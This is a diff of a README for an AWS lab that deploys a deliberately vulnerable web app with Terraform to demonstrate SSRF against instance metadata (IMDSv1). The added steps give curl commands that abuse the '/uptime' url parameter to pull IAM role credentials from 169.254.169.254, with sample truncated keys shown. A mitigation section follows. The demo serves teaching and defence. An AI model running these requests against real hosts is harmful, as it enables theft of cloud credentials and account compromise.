@@ -15,7 +15,7 @@ The environment will be deployed with Terraform IaC module.
 * AWS IAM user with AWS credential type: ["Access key - Programmatic access"](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) and [AdministratorAccess](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)
 
 *  [Terraform installed](https://learn.hashicorp.com/tutorials/terraform/install-cli)
-* Clone this repo to the enviromet which you run terraform from :
+* Clone this repo to the environmnet which you run terraform from : 
 ```ShellSession
 git clone https://github.com/ramibo/ssrf_aws_demo.git 
 ```
@@ -26,14 +26,36 @@ providers.tf: `shared_config_files`,`shared_credentials_files` `profile` , `regi
 
 
 
-## How to run this code
+## Running the demo
 
 1. `cd` to the  `ssrf_aws_demo` directory.
 2. Run `terraform init` command to prepare your working directory for next commands.
 3. Run `terraform validate` command check whether the configuration is valid.
 4. Run `terraform plan` command show changes required by the current configuration.
 5. Run `terraform apply` / `terraform apply -auto-approve` to create / update the infrastructure at AWS
+6. If there no errors from the prvious steps , from your terminal run the following:
+__Important !__ - The `host` can be the created ec2 instance [Public IPv4 address / DNS ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses).
+```ShellSession
+bash$ curl -s http://host:5000 
+AWS SSRF IMDSv1 demo
+```
+7. The `/uptime` page is vulnerable to an SSRF attack, we will utilize the url parameter with the instance metadata URI --> retrieve the attached role --> extract the security credentials as following:
+```ShellSession
+bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+aws_ssrf_demo_iam_role
+bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssrf_demo_iam_role
+{
+  "Code" : "Success",
+  "LastUpdated" : "2022-12-20T20:56:29Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIASF",
+  "SecretAccessKey" : "Id+zUu",
+  "Token" : "IQoJb3JpZ2luX2VjEEUaCXVzLW",
+  "Expiration" : "2022-12-21T03:31:14Z"
+}
+```
 
+8. 
 ## Mitigation Steps
 
 1. Enabling IMDS version 2 of the service
